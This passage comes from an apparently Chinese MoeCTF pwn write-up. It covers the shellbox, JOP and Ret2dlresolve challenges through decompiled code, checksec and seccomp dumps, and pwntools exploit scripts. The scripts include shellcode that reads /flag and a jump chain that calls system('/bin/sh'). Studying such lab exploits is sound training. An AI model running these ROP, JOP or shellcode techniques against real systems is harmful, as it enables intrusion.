class="number">0x38</span>+p64(backdoor_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="shellbox">shellbox</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v4[<span class="number">4</span>]; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> n9; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  sandbox();</span><br><span class="line">  n9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You have a box, fill it.&quot;</span>);</span><br><span class="line">  read(<span class="number">0LL</span>, &amp;buf, <span class="number">256LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now, leave your name..&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( n9 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( n9 &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Why is it so long?&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">62LL</span>);</span><br><span class="line">    read(<span class="number">0LL</span>, &amp;v4[<span class="number">8</span> * n9++], <span class="number">8LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sandbox</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r9d</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = seccomp_init(<span class="number">2147418112LL</span>);</span><br><span class="line">  seccomp_rule_add(v5, <span class="number">0</span>, <span class="number">59</span>, <span class="number">0</span>, v0, v1);</span><br><span class="line">  seccomp_rule_add(v5, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, v2, v3);</span><br><span class="line">  <span class="keyword">return</span> seccomp_load(v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:00000000004CEB60                 public buf</span><br><span class="line">.bss:00000000004CEB60 buf             db    ? ;               ; DATA XREF: main+3B↑o</span><br><span class="line">.bss:00000000004CEB61                 db    ? ;</span><br><span class="line">.bss:00000000004CEB62                 db    ? ;</span><br><span class="line">...</span><br><span class="line">.bss:00000000004CEC5E                 db    ? ;</span><br><span class="line">.bss:00000000004CEC5F                 db    ? ;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ubuntu@LAPTOP-RA1SUD0S:~/Moectf/shellbox$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/ubuntu/Moectf/shellbox/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ubuntu@LAPTOP-RA1SUD0S:~/Moectf/shellbox$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure>
<p>这题是静态链接，尽管开了NX但是可以使用mprotect开权限</p>
<p>先在bss段上布置shellcode，再想办法使用mprotect</p>
<p>先进行<code>n9</code>的绕过，第一次恰好是修改rbp-0x8，将<code>n9</code>改为1即可</p>
<p>因为我们人为增加了n9，所以第二次改的是rbp+0x8，构造ROP链即可</p>
<p>先用gadget把参数传递好，再调用mprotect，再调用shellcode</p>
<p>执行前</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00:0000│ rsp 0x7ffff8a938b0 —▸ 0x4ceb60 (buf) ◂— 0x67616c662fb848</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x4cd000           0x4cf000 rw-p     2000   cd000 Moectf/shellbox/pwn</span><br></pre></td></tr></table></figure>
<p>执行后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00:0000│ rsp 0x7ffff8a938b0 —▸ 0x4ceb60 (buf) ◂— movabs rax, 0x67616c662f /* 0x67616c662fb848 */</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x4ce000           0x4cf000 rwxp     1000   ce000 Moectf/shellbox/pwn</span><br></pre></td></tr></table></figure>
<p>shellcode的构造就省略了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=start()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;You have a box, fill it.&quot;</span>)</span><br><span class="line">shellcode =<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax,0x0067616c662f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov rax,257</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">inc rdi</span></span><br><span class="line"><span class="string">mov rsi,rax</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov r10,0x100</span></span><br><span class="line"><span class="string">mov rax,40</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#shell=asm(shellcode)</span></span><br><span class="line"><span class="comment">#p.send(shell+p64(0)*0x10)</span></span><br><span class="line">p.send(<span class="string">b&#x27;H\xb8/flag\x00\x00\x00PH\x89\xe6H1\xd2H\xc7\xc0\x01\x01\x00\x00\x0f\x05H1\xffH\xff\xc7H\x89\xc6H1\xd2I\xc7\xc2\x00\x01\x00\x00H\xc7\xc0(\x00\x00\x00\x0f\x05&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(p64(<span class="number">0x000100000001</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(p64(<span class="number">0x401a40</span>))    <span class="comment">#pop rdi</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(p64(<span class="number">0x4CE000</span>))    <span class="comment">#addr</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(p64(<span class="number">0x401a42</span>))    <span class="comment">#pop rsi</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(p64(<span class="number">0x1000</span>))      <span class="comment">#size</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(p64(<span class="number">0x401a44</span>))    <span class="comment">#pop rdx</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(p64(<span class="number">0x7</span>))         <span class="comment">#read,write,execve</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(p64(<span class="number">0x443520</span>))    <span class="comment">#mprotect</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(p64(<span class="number">0x4CEB60</span>))    <span class="comment">#shellcode</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="jop">JOP</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[[ Programmable MoeBot v1.0 ]]\nPlease specify the gestures.&quot;</span>);</span><br><span class="line">  program();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Registered %zu gestures. Executing the program...\n&quot;</span>, n_gestures);</span><br><span class="line">  execute(&amp;gestures);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">program</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v2 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="type">unsigned</span> __int64)n_gestures &lt;= <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;0. Finish\n1. Walk\n2. Wave Hands\n3. Jump\n4. Turn around\n5. Stand still&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Choose your gesture: &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)_isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v1) &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        gestures[v2] = walk;</span><br><span class="line">        ++n_gestures;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        gestures[v2] = wave_hands;</span><br><span class="line">        ++n_gestures;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        gestures[v2] = jump;</span><br><span class="line">        ++n_gestures;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        gestures[v2] = turn;</span><br><span class="line">        ++n_gestures;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        gestures[v2] = stand_still;</span><br><span class="line">        ++n_gestures;</span><br><span class="line">LABEL_11:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;What should I say after this gesture? &quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">if</span> ( !fgets(&amp;talks[<span class="number">16</span> * v2], <span class="number">16</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice, try again.&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v2;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_15:</span><br><span class="line">  result = v3 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    _stack_chk_fail();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">execute</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 n_gestures; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    n_gestures = n_gestures;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= n_gestures )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    (*(<span class="type">void</span> (**)(<span class="type">void</span>))(<span class="number">8</span> * i + a1))();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;talks[<span class="number">16</span> * i]);</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> n_gestures;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0000000000404040                 public n_gestures</span><br><span class="line">.bss:0000000000404040 n_gestures      dq ?                    ; DATA XREF: execute:loc_40117D↑r</span><br><span class="line">.bss:0000000000404040                                         ; program+C5↑r ...</span><br><span class="line">.bss:0000000000404048                 align 20h</span><br><span class="line">.bss:0000000000404060                 public talks</span><br><span class="line">.bss:0000000000404060 ; char talks[128]</span><br><span class="line">.bss:0000000000404060 talks           db 80h dup(?)           ; DATA XREF: execute+45↑o</span><br><span class="line">.bss:0000000000404060                                         ; program+1E6↑o</span><br><span class="line">.bss:00000000004040E0                 public gestures</span><br><span class="line">.bss:00000000004040E0 ; _QWORD gestures[8]</span><br><span class="line">.bss:00000000004040E0 gestures        dq 8 dup(?)             ; DATA XREF: program+B3↑o</span><br><span class="line">.bss:00000000004040E0                                         ; program+E8↑o ...</span><br><span class="line">.bss:00000000004040E0 _bss            ends</span><br><span class="line">.prgend:0000000000404120 ;</span><br></pre></td></tr></table></figure>
<p>我们从program中发现选择无效值，就可以使v2增加，达到在gestures后面写</p>
<p>先选择8次无效值使v2变为8，此时talk恰好落在gestures上，可以被execute执行，而原来的gestures被放在后面</p>
<p>于是可以构造JOP链，观察到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000401231                 public gift</span><br><span class="line">.text:0000000000401231 gift            proc near</span><br><span class="line">.text:0000000000401231 ; __unwind &#123;</span><br><span class="line">.text:0000000000401231                 endbr64</span><br><span class="line">.text:0000000000401235                 mov     rax, rdi</span><br><span class="line">.text:0000000000401238                 mov     rdi, [rax+8]</span><br><span class="line">.text:000000000040123C                 call    qword ptr [rax+10h]</span><br><span class="line">.text:000000000040123F                 retn</span><br><span class="line">.text:000000000040123F gift            endp</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000401228                 call    cs:system_ptr</span><br></pre></td></tr></table></figure>
<p>可以将rax+0x8作为参数，然后执行rax+0x10</p>
<p>于是先写入gift地址，再写入/bin/sh00地址，再写入call system，即可完成</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tele 0x4040E0</span><br><span class="line">00:0000│     0x4040e0 (gestures) —▸ 0x401231 (gift) ◂— endbr64</span><br><span class="line">01:0008│     0x4040e8 (gestures+8) —▸ 0x404110 (gestures+48) ◂— 0x68732f6e69622f /* <span class="string">&#x27;/bin/sh&#x27;</span> */</span><br><span class="line">02:0010│     0x4040f0 (gestures+16) —▸ 0x401228 (unreachable+18) ◂— call qword ptr [rip + 0x2d92]</span><br><span class="line">03:0018│     0x4040f8 (gestures+24) ◂— 0xa /* <span class="string">&#x27;\n&#x27;</span> */</span><br><span class="line">04:0020│     0x404100 (gestures+32) —▸ 0x401228 (unreachable+18) ◂— call qword ptr [rip + 0x2d92]</span><br><span class="line">05:0028│     0x404108 (gestures+40) ◂— 0xa /* <span class="string">&#x27;\n&#x27;</span> */</span><br><span class="line">06:0030│     0x404110 (gestures+48) ◂— 0x68732f6e69622f /* <span class="string">&#x27;/bin/sh&#x27;</span> */</span><br><span class="line">07:0038│     0x404118 (gestures+56) ◂— 0xa /* <span class="string">&#x27;\n&#x27;</span> */</span><br><span class="line">pwndbg&gt;</span><br><span class="line">08:0040│     0x404120 ◂— 0x68732f6e69622f /* <span class="string">&#x27;/bin/sh&#x27;</span> */</span><br><span class="line">09:0048│     0x404128 —▸ 0x40000a ◂— 0x2000000000000</span><br><span class="line">0a:0050│     0x404130 ◂— 0x68732f6e69622f /* <span class="string">&#x27;/bin/sh&#x27;</span> */</span><br><span class="line">0b:0058│     0x404138 —▸ 0x40000a ◂— 0x2000000000000</span><br><span class="line">0c:0060│     0x404140 ◂— 0x68732f6e69622f /* <span class="string">&#x27;/bin/sh&#x27;</span> */</span><br><span class="line">0d:0068│     0x404148 —▸ 0x40000a ◂— 0x2000000000000</span><br><span class="line">0e:0070│     0x404150 ◂— 0x68732f6e69622f /* <span class="string">&#x27;/bin/sh&#x27;</span> */</span><br><span class="line">0f:0078│     0x404158 —▸ 0x40000a ◂— 0x2000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = start()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Choose your gesture: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Choose your gesture: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Choose your gesture: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Choose your gesture: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Choose your gesture: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Choose your gesture: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Choose your gesture: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Choose your gesture: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Choose your gesture: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;What should I say after this gesture? &quot;</span>)</span><br><span class="line">p.sendline(p64(<span class="number">0x401231</span>)+<span class="string">b&#x27;\x10\x41\x40\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Choose your gesture: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;What should I say after this gesture? &quot;</span>)</span><br><span class="line">p.sendline(p64(<span class="number">0x401228</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Choose your gesture: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;What should I say after this gesture? &quot;</span>)</span><br><span class="line">p.sendline(p64(<span class="number">0x401228</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Choose your gesture: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;What should I say after this gesture? &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Choose your gesture: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;What should I say after this gesture? &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Choose your gesture: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;What should I say after this gesture? &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Choose your gesture: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;What should I say after this gesture? &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Choose your gesture: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;What should I say after this gesture? &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ret2dlresolve">Ret2dlresolve</h3>
<p>这个还没有理解完全，题解写的不是太完全太好，望理解，wp在最后面</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000401156 ; void magic()</span><br><span class="line">.text:0000000000401156                 public magic</span><br><span class="line">.text:0000000000401156 magic           proc near</span><br><span class="line">.text:0000000000401156 ; __unwind &#123;</span><br><span class="line">.text:0000000000401156                 endbr64</span><br><span class="line">.text:000000000040115A                 push    rbp</span><br><span class="line">.text:000000000040115B                 mov     rbp, rsp</span><br><span class="line">.text:000000000040115E                 pop     rdi</span><br><span class="line">.text:000000000040115F                 retn</span><br><span class="line">.text:000000000040115F magic           endp</span><br><span class="line">.text:000000000040115F</span><br><span class="line">.text:0000000000401160 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000401160                 pop     rsi</span><br><span class="line">.text:0000000000401161                 retn</span><br><span class="line">.text:0000000000401161 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000401162                 db 90h</span><br><span class="line">.text:0000000000401163 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000401163                 pop     rbp</span><br><span class="line">.text:0000000000401164                 retn</span><br><span class="line">.text:0000000000401164 ; &#125; // starts at 401156</span><br></pre></td></tr></table></figure>
<p>没有后门，也没有任何信息泄露，只有写入足够多内容的能力，是NO RELRO或Partial RELRO，这时候可以使用Ret2dlresolve</p>
<h4 id="elf-header">ELF Header</h4>
<h5 id="位">32位</h5>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The ELF file header.  This appears at the start of every ELF file.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT (16)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	e_ident[EI_NIDENT];	<span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf32_Half	e_type;			<span class="comment">/* Object file type */</span></span><br><span class="line">  Elf32_Half	e_machine;		<span class="comment">/* Architecture */</span></span><br><span class="line">  Elf32_Word	e_version;		<span class="comment">/* Object file version */</span></span><br><span class="line">  Elf32_Addr	e_entry;		<span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf32_Off		e_phoff;		<span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf32_Off		e_shoff;		<span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf32_Word	e_flags;		<span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf32_Half	e_ehsize;		<span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf32_Half	e_phentsize;		<span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf32_Half	e_phnum;		<span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf32_Half	e_shentsize;		<span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf32_Half	e_shnum;		<span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf32_Half	e_shstrndx;		<span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure>
<h5 id="位-1">64位</h5>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span>   e_ident[EI_NIDENT];</span><br><span class="line">        Elf64_Half      e_type;</span><br><span class="line">        Elf64_Half      e_machine;</span><br><span class="line">        Elf64_Word      e_version;</span><br><span class="line">        Elf64_Addr      e_entry;</span><br><span class="line">        Elf64_Off       e_phoff;</span><br><span class="line">        Elf64_Off       e_shoff;     <span class="comment">// 重要: 我们下一步的解析目标就从这里开始,这个段表的文件内偏移</span></span><br><span class="line">        Elf64_Word      e_flags;</span><br><span class="line">        Elf64_Half      e_ehsize;</span><br><span class="line">        Elf64_Half      e_phentsize;</span><br><span class="line">        Elf64_Half      e_phnum;</span><br><span class="line">        Elf64_Half      e_shentsize;</span><br><span class="line">        Elf64_Half      e_shnum;     <span class="comment">// 重要: 这里给出了段表中的表项的个数</span></span><br><span class="line">        Elf64_Half      e_shstrndx;  <span class="comment">// 重要: 这里给出了段表中引用的用于表示段名的字符串表的段表项索引</span></span><br><span class="line">&#125; Elf64_Ehdr;</span><br></pre></td></tr></table></figure>
<p>它们的内容结构其实是一样的（不是全部，可以基本认为是完全等价的），只是存储宽度不一样而已</p>
<ul>
